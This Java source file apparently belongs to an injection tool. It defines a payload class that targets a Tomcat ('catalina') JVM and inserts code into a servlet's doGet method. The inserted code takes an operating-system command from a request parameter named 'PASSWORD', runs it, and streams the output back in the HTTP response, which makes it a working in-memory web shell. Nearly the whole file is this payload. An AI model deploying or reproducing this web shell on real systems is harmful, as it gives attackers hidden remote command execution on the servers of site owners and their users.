package com.company.payloads;

import com.company.Config;

public class Demo extends Config {
    public static String jvmKeyword = "catalina";
    public Demo() {
        className = "com.company.Test";
        methodName = "doGet";
        code = "javax.servlet.http.HttpServletRequest request = $1;\n" +
                "javax.servlet.http.HttpServletResponse response = $2;\n" +
                "String cmd = request.getParameter(\"PASSWORD\");\n" +
                "if (cmd != null) {\n" +
                "Process process = Runtime.getRuntime().exec(cmd);\n" +
                "java.io.BufferedReader bufferedReader = new java.io.BufferedReader(\n" +
                "new java.io.InputStreamReader(process.getInputStream()));\n" +
                "StringBuilder stringBuilder = new StringBuilder();\n" +
                "String line;\n" +
                "while ((line = bufferedReader.readLine()) != null) {\n" +
                "stringBuilder.append(line + '\\n');\n" +
                "}\n" +
                "response.getOutputStream().write(stringBuilder.toString().getBytes());\n" +
                "response.getOutputStream().flush();\n" +
                "response.getOutputStream().close();\n" +
                "}";
    }
}
